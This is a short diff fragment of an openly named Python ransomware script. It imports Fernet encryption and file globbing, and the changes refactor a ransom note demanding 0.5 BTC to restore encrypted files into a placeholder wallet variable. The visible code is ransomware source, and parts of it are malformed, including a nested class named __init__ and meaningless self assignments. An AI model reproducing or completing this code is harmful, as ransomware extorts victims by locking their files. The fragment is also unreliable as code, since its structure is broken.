@@ -5,17 +5,23 @@ from cryptography.fernet import Fernet
 from glob import glob
 import os
 
-class restore():
+class Wallet():
+    global wallet
+    wallet = b"Your_wallet"
+
+class Restore():
     global restore_text
-    restore_text = b"""All your files has been encrypted\n\n\
+    restore_text = (b"All your files has been encrypted\n\n\
 If you want to restored it send 0.5 BTC to the following wallet:\n\n\
-ads873asdi29ase2323"""
+"+wallet)
 
 class Ransomware():
 
     class __init__():
         def __init__( ):
-             file = None
+            file = None
+            self = None
+            self_ = None
 
     global generate_key
     global return_key
